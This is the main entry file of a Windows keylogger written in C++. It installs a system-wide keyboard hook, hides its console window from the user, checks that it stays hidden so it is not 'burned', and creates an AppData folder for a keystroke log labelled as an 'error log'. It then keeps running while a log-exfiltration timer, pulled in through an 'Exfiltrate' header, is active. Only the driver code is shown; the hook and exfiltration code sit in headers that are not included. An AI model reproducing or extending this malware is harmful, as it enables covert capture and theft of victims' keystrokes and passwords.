// This is me ignoring the fact that in the auxiliary header file, I used the unsafe localtime function instead of the safe localtime_s function
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include "IO.h"
#include "Keyboard.h"
#include "Transformer.h"
#include "Timer.h"
#include "Exfiltrate.h"
#include "APIHook.h"
#include "Auxiliary.h"

int main()
{

    // Hook into the Windows system that handles key presses

    APIHook::installHook();
   
    // Hide console window from user

    Auxiliary::hideConsole();

    // If console window is hidden, then continue, otherwise we're burned
    
    if (!Auxiliary::isConsoleVisible())
    {
        // Create the directory where the error log will be stored

        IO::createDirectory(IO::getAppDataPath());

        MSG Msg;

        // Dummy loop to keep execution going

        while (GetMessage(&Msg, NULL, 0, 0))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        APIHook::logExfilTimer.stopTimer();

    }

    return 0;
}
